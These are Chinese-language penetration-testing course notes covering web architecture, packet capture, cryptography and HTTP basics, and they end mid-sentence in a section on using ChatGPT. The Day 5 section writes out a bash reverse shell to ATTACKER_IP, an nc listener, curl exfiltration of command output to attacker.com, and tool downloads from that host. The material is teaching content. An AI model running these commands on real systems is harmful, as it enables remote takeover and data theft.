# 小迪安全课程笔记 2024 📚

在本教程中，我们将系统性地学习网络安全领域的核心知识与实践技能。课程内容涵盖从Web应用基础架构、信息收集、安全开发到各类漏洞攻防的完整知识体系，旨在帮助初学者构建全面的网络安全认知框架。



## P1：第1天：【基础入门】-Web应用&架构搭建&站库分离&路由访问&配置受限&DNS解析 🌐

本节课中我们将要学习Web应用的基础概念和架构搭建。



Web应用是运行在服务器上，通过浏览器访问的应用程序。理解其基础架构是学习网络安全的起点。



上一节我们介绍了课程的整体目标，本节中我们来看看Web应用的基础构成。



以下是Web应用的核心组成部分：

*   **客户端**：用户使用的浏览器。
*   **服务器**：运行Web应用程序和数据库的计算机。
*   **网络**：连接客户端和服务器的媒介。



站库分离是一种安全架构设计，它将Web服务器和数据库服务器部署在不同的主机上。其核心公式可以表示为：

```
攻击面 = Web服务器攻击面 + 数据库服务器攻击面
```

通过分离，即使Web服务器被攻破，攻击者也无法直接访问数据库，从而提高了安全性。



路由访问指的是用户通过URL访问服务器上特定资源的过程。配置受限是指对服务器上的文件、目录或服务访问权限进行限制。DNS解析是将域名转换为IP地址的过程，其基本流程为：

```
用户输入域名 -> 本地DNS缓存 -> 递归DNS服务器 -> 根域名服务器 -> 顶级域名服务器 -> 权威域名服务器 -> 获取IP地址
```



本节课中我们一起学习了Web应用的基本概念、站库分离的安全优势、路由访问的原理以及DNS解析的工作流程。这些是理解后续更复杂安全议题的基础。



## P2：第2天-Web架构&前后端分离站&Docker容器站&集成软件站&建站分配 🏗️

本节课中我们将要学习几种常见的Web架构及其搭建方式。



不同的业务需求和技术选型催生了多样的Web架构。了解这些架构有助于我们分析其潜在的安全风险。



上一节我们学习了基础的Web应用架构，本节中我们来看看几种更具体的架构模式。



以下是几种常见的Web架构：

*   **前后端分离架构**：前端负责展示和用户交互，后端提供API接口。前后端通过HTTP协议通信，通常使用JSON格式交换数据。示例代码片段：
    ```javascript
    // 前端使用Fetch API调用后端接口
    fetch('/api/user/data')
      .then(response => response.json())
      .then(data => console.log(data));
    ```
*   **Docker容器站**：使用Docker容器技术将应用及其依赖打包部署。其核心命令是：
    ```bash
    docker run -d -p 80:80 nginx
    ```
*   **集成软件站**：使用如宝塔面板、XAMPP等集成环境快速搭建网站。
*   **建站分配**：指根据需求选择不同的建站方式，例如使用CMS、自主开发或云服务商模板。



本节课中我们一起学习了前后端分离、Docker容器化、集成软件等多种Web架构与建站方式，理解了它们的基本原理和实现方法。



## P3：第3天.Web架构&OSS存储&负载均衡&CDN加速&反向代理&WAF防护 🛡️

本节课中我们将要学习现代Web架构中用于提升性能、可用性和安全性的关键组件。



随着业务规模扩大，单一的Web服务器难以应对高并发和复杂威胁，因此需要引入一系列辅助组件。



上一节我们了解了不同的建站架构，本节中我们来看看支撑大型应用的关键技术。



以下是提升Web架构能力的关键技术：

*   **OSS存储**：对象存储服务，用于存储图片、视频等静态文件。访问URL格式通常为：`https://bucket-name.oss-region.aliyuncs.com/object-key`
*   **负载均衡**：将流量分发到多个后端服务器，防止单点过载。常用算法有轮询、最小连接数等。
*   **CDN加速**：内容分发网络，将静态资源缓存到全球边缘节点，加速用户访问。
*   **反向代理**：代理服务器接收客户端请求，转发给内网服务器，并返回结果。它隐藏了真实服务器，并提供缓存、SSL卸载等功能。
*   **WAF防护**：Web应用防火墙，过滤恶意HTTP流量，防御SQL注入、XSS等攻击。其规则匹配逻辑可简化为：
    ```
    如果（请求参数 包含 “<script>”）则 { 拦截请求 }
    ```



本节课中我们一起学习了OSS存储、负载均衡、CDN、反向代理和WAF等组件，理解了它们如何共同构建一个高性能、高可用的安全Web架构。



## P4：第4天.APP架构&小程序&H5+Vue语言&Web封装&原生开发&Flutter 📱

本节课中我们将要学习移动端应用的常见架构和开发技术。



移动互联网时代，应用不再局限于浏览器。了解移动端的技术栈对进行全面的安全评估至关重要。



上一节我们聚焦于Web服务端架构，本节中我们将视角转向客户端，特别是移动端。



以下是移动应用的主要开发模式：

*   **原生开发**：使用平台特定语言开发（如Java/Kotlin for Android， Swift/Objective-C for iOS）。性能最佳，但需维护多套代码。
*   **H5 + 框架**：使用HTML5、CSS、JavaScript开发，并通过Vue、React等框架组织代码，最终在WebView中运行。便于跨平台，但性能受限。
*   **小程序**：运行在超级APP（如微信、支付宝）内的轻量级应用，使用特定框架（如微信小程序框架）开发。
*   **Web封装**：将H5应用通过工具（如Cordova、Capacitor）封装成原生安装包，可以调用部分设备API。
*   **跨平台框架**：使用Flutter（Dart语言）、React Native（JavaScript）等框架，编写一套代码，编译成多个平台的原生应用。Flutter渲染原理可简述为自绘引擎直接与Skia图形库通信。



本节课中我们一起学习了原生开发、H5混合开发、小程序、Web封装及Flutter等跨平台开发模式，了解了移动应用的不同形态及其技术特点。



## P5：第5天.反弹SHELL&不回显带外&正反向连接&防火墙出入站&文件下载 ⚡

本节课中我们将要学习在渗透测试中获取远程控制权限的常见技术——反弹Shell，及其相关概念。



在成功利用漏洞后，攻击者通常需要建立一个与目标机器的持久化命令执行通道，反弹Shell是常见手段。



上一节我们学习了应用架构，本节中我们进入更具操作性的攻防技术环节。



反弹Shell的本质是让目标机器主动连接攻击者控制的服务器，并打开一个命令执行会话。其核心命令示例（Bash反弹）为：

```bash
# 在目标机器上执行（反向连接）
bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1

# 攻击者监听端口
nc -lvp ATTACKER_PORT
```



以下是反弹Shell涉及的关键概念：

*   **正反向连接**：
    *   **正向连接**：攻击者主动连接目标开放的服务端口。`攻击者 -> 目标`
    *   **反向连接**：目标机器主动连接攻击者的监听端口。`目标 -> 攻击者`。常用于绕过目标出口防火墙。
*   **不回显与带外**：
    *   **不回显**：命令执行后，结果不直接显示在当前页面或通道中。
    *   **带外数据**：利用其他协议通道（如DNS、HTTP）将命令执行结果外传。例如使用`curl`将结果发送到攻击者服务器：`curl http://attacker.com/`?`result=$(whoami)`
*   **防火墙出入站规则**：防火墙可以限制入站和出站连接。反弹Shell常利用出站规则通常较宽松的特点。
*   **文件下载**：在获取Shell后，常需要下载工具。方法包括：
    *   `wget http://attacker.com/tool`
    *   `curl -O http://attacker.com/tool`
    *   利用编程语言（如Python、PHP）的下载功能。



本节课中我们一起学习了反弹Shell的原理、正反向连接的区别、如何通过带外技术解决不回显问题，以及防火墙规则对连接的影响和基本的文件下载方法。



## P6：第6天.抓包技术&HTTPS协议&APP&小程序&PC应用&WEB&转发联动 🔍

本节课中我们将要学习网络抓包技术，以及如何对不同类型应用进行流量分析。



抓包是分析应用行为、发现安全漏洞的基础技能。理解数据如何在网络中传输是安全分析的第一步。



上一节我们学习了如何建立远程控制通道，本节中我们来看看如何监听和分析网络通信。



网络抓包是指截获、记录和分析通过网络接口传输的数据包的过程。



以下是针对不同应用的抓包技术要点：

*   **HTTP/HTTPS协议**：
    *   HTTP协议明文传输，可直接查看。
    *   HTTPS协议在传输层加密，需要配置CA证书进行中间人解密才能查看明文。工具如Burp Suite、Fiddler都提供此功能。
*   **WEB应用**：通过配置浏览器代理到抓包工具（如Burp Suite， 代理通常为`127.0.0.1:8080`）即可抓取。
*   **APP应用**：
    *   **安卓**：在设备上安装抓包工具的CA证书，并配置Wi-Fi代理。
    *   **iOS**：同样需要安装证书并配置代理。可能需信任证书。
*   **小程序**：运行环境受限，抓包方法与APP类似。部分小程序可能使用自有协议或强证书校验，增加抓包难度。
*   **PC应用**：配置系统代理或使用透明代理工具。对于不遵循系统代理的应用，可能需要使用`iptables`等工具进行流量转发。
*   **转发联动**：指将抓取到的流量从一个工具转发到另一个工具进行联动分析。例如，将Burp Suite的流量镜像到Wireshark进行更底层的协议分析。



本节课中我们一起学习了针对Web、APP、小程序和PC应用的不同抓包方法，理解了HTTPS解密的原理，并了解了流量转发联动的概念。



## P7：第7天.抓包技术&全局协议&封包监听&网卡模式&APP&小程序&PC应用 📡

本节课中我们将要深入学习抓包技术的底层原理和高级模式。



除了简单的代理抓包，在某些场景下需要更底层的流量捕获技术。



上一节我们介绍了针对不同应用的抓包方法，本节中我们探讨更底层的抓包模式。



封包监听是指在网络接口上直接捕获原始数据包，这需要工具拥有底层网络访问权限。



以下是底层抓包相关的核心概念：

*   **全局协议**：抓包工具需要支持解析多种网络协议，如Ethernet、IP、TCP、UDP、HTTP、TLS等。
*   **网卡模式**：
    *   **混杂模式**：网卡接收所有流经其网络的数据包，而不仅仅是发给它的数据包。这是抓取同一局域网内其他主机流量的基础。
    *   切换命令示例（Linux）：`ifconfig eth0 promisc`
*   **封包监听工具**：
    *   **Wireshark/Tshark**：功能强大的图形化/命令行抓包分析工具。
    *   **tcpdump**：经典的命令行抓包工具。基础命令：`tcpdump -i eth0 -w capture.pcap`
*   **针对复杂环境的抓包**：
    *   **APP/小程序**：对于做了证书绑定或双向认证的应用，可能需要使用Xposed、Frida等框架进行Hook，或对应用进行重打包。
    *   **PC应用**：对于绕过系统代理或使用自定义协议的应用，可能需要使用驱动级抓包工具，或采用ARP欺骗等手法进行流量牵引。



本节课中我们一起学习了封包监听的原理、网卡混杂模式的作用，并了解了在遇到复杂情况时抓包所面临的挑战和进阶思路。



## P8：第8天：算法分析&传输加密&数据格式&密文存储&代码混淆&逆向保护护 🔐

本节课中我们将要学习应用安全中常见的防护技术，重点是算法和加密。



开发者会使用各种技术来保护数据、通信和代码逻辑，防止被轻易分析或篡改。



上一节我们学习了如何捕获流量，本节中我们来看看应用如何保护其传输和存储的数据。



以下是应用常见的保护技术：

*   **传输加密**：使用TLS/SSL协议对传输过程中的数据进行加密，防止窃听和篡改。其核心是**非对称加密**交换密钥，**对称加密**加密数据。
*   **数据格式**：除了加密，数据可能被编码或序列化。常见格式有：
    *   **编码**：Base64、Hex。示例：`Base64.encode("hello") -> "aGVsbG8="`
    *   **序列化**：JSON、XML、Protocol Buffers。将数据结构转换为可传输或存储的格式。
*   **密文存储**：敏感数据（如密码）不应明文存储。通常使用**哈希算法**（如SHA-256）存储其摘要，或使用**加密算法**（如AES）存储密文。密码存储示例：
    ```
    存储值 = Salt + Hash(Password + Salt)
    ```
*   **代码混淆与逆向保护**：
    *   **代码混淆**：重命名变量、函数，插入无用代码，使源代码难以阅读。JavaScript混淆工具如UglifyJS。
    *   **逆向保护**：对编译后的二进制文件加壳、加密，增加反编译和调试的难度。



本节课中我们一起学习了传输加密、数据格式、密文存储的基本原理，以及代码混淆和逆向保护的目的，这些都是分析应用安全时需要考虑的防护层。



## P9：第9天：算法逆向&散列对称非对称&JS源码逆向&AES&DES&RSA&SHA 🧩

本节课中我们将要学习密码学算法的分类，并开始接触逆向分析的基本思路。



理解算法是逆向分析的基础。不同的算法用于不同的安全目的。



上一节我们概述了各种安全技术，本节中我们深入算法层面。



密码学算法主要分为三类：散列算法、对称加密算法和非对称加密算法。



以下是这三类算法的核心特点：

*   **散列算法**：将任意长度数据映射为固定长度的摘要，不可逆。用于验证数据完整性。常见算法：
    *   **MD5**：输出128位，已不安全。
    *   **SHA-1**：输出160位，已不推荐。
    *   **SHA-256**：属于SHA-2家族，输出256位，目前安全。
*   **对称加密算法**：加密和解密使用同一密钥。速度快，用于加密大量数据。常见算法：
    *   **DES**：密钥过短，已不安全。
    *   **AES**：目前最常用的对称加密标准。密钥长度可为128、192、256位。
    *   加解密公式：`Ciphertext = AES_Encrypt(Plaintext, Key)`
*   **非对称加密算法**：使用公钥加密，私钥解密。用于密钥交换和数字签名。常见算法：
    *   **RSA**：基于大数分解难题。
    *   加密公式：`Ciphertext = Plaintext^E mod N` （公钥为(E， N)）
    *   解密公式：`Plaintext = Ciphertext^D mod N` （私钥为(D， N)）
*   **JS源码逆向**：对于前端JavaScript代码，需要分析其混淆后的逻辑，定位关键算法（如登录的密码加密函数）。工具包括浏览器开发者工具、AST解析库等。



本节课中我们一起学习了散列、对称加密和非对称加密的代表性算法及其特点，并了解了JavaScript源码逆向是分析前端加密逻辑的常见任务。



## P10：第10天：HTTP数据包&Postman构造&请求方法&请求头修改&状态码判断 🌐

本节课中我们将要学习HTTP协议数据包的构成，以及如何使用工具手动构造和发送HTTP请求。



HTTP是Web通信的基石。手动操控HTTP请求是测试漏洞、理解应用逻辑的关键技能。



上一节我们探讨了底层算法，本节我们回到应用层，学习HTTP协议的具体细节。



一个HTTP数据包主要由请求行/状态行、请求头/响应头、消息体三部分组成。



以下是HTTP数据包的核心组成部分和操作：

*   **请求方法**：定义对资源的操作类型。
    *   **GET**：请求资源。
    *   **POST**：提交数据。
    *   **PUT**：更新资源。
    *   **DELETE**：删除资源。
    *   其他：HEAD、OPTIONS、PATCH等。
*   **请求头**：包含请求的元信息。常见且重要的请求头：
    *   `Cookie`：用于身份认证。
    *   `User-Agent`：标识客户端类型。
    *   `Referer`：表示请求来源。
    *   `X-Forwarded-For`：常被用于标识客户端原始IP。
*   **使用Postman构造请求**：Postman是一个API测试工具，可以方便地设置请求方法、URL、Headers和Body（支持form-data、x-www-form-urlencoded、raw JSON等格式）。
*   **状态码判断**：服务器响应的状态码指示请求结果。
    *   **2xx**：成功（如200 OK）。
    *   **3xx**：重定向（如302 Found）。
    *   **4xx**：客户端错误（如403 Forbidden， 404 Not Found）。
    *   **5xx**：服务器错误（如500 Internal Server Error）。



本节课中我们一起学习了HTTP数据包的结构、如何使用Postman工具、各种请求方法的作用、重要请求头的含义以及如何通过状态码判断请求结果。



## P11：第11天.ChatGPT篇&注册体验&结合安全&融入技术&高效赋能&拓展需求 🤖

本节课中我们将要学习如何将AI工具ChatGPT应用于网络安全学习和实践。



人工智能技术正在改变各行各业，网络安全领域也不例外。善用AI工具可以极大提升学习和工作效率。



上一节我们掌握了手动操作HTTP请求的技能，本节中我们引入一个强大的辅助工具。



ChatGPT是一个大型语言模型，能够理解并生成文本，可用于解答问题、编写代码、分析思路等。



以下是将ChatGPT融入网络安全学习与实践的几个方面：

*   **注册体验**：访问OpenAI平台完成注册，即可使用ChatGPT。
*   **结合安全**：
    *   **概念解释**：请求它解释SQL注入、